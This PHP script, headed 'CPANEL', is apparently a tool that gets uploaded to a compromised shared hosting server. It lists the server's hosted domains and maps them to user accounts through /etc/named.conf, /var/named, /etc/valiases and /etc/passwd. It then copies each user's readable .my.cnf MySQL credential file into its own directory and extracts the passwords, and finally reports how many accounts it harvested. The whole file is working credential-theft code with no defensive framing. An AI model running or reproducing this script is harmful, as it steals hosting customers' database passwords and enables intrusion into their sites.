CPANEL<br>
<?php
echo "Kernel : ".php_uname()." ezz<br>";
// cp
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[$i]);
return trim($ar1[0]);
}
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
if($domains or $d0mains){
$domains = scandir("/var/named");
if($domains) {
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
$dc++;
}}}
$total = $dc;
echo 'Ada '.$total.' Cpanel';
}else{
$d0mains = @file('/etc/named.conf');
if($d0mains){
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
if(@eregi('zone',$d0main)){
preg_match_all('#zone "(.*)"#',$d0main,$domain);
flush();
if(strlen(trim($domain[1][0])) >2){
$mck[] = $domain[1][0];
}}}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
$infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
$usr[] = $infos['name'];
$dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
$r = explode(':',$d);
if(strpos($r[5],'home')){
$passwd[$r[0]] = $r[5];
}}
$l=0;
$j=1;
foreach($usr as $r){
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
$dc++;
flush();
$l=$l?0:1;
$j++;
}}}
$total = $dc;
echo 'Ada '.$total.' Cpanel';
}
}else{
echo "Not Accessible!";
}
?>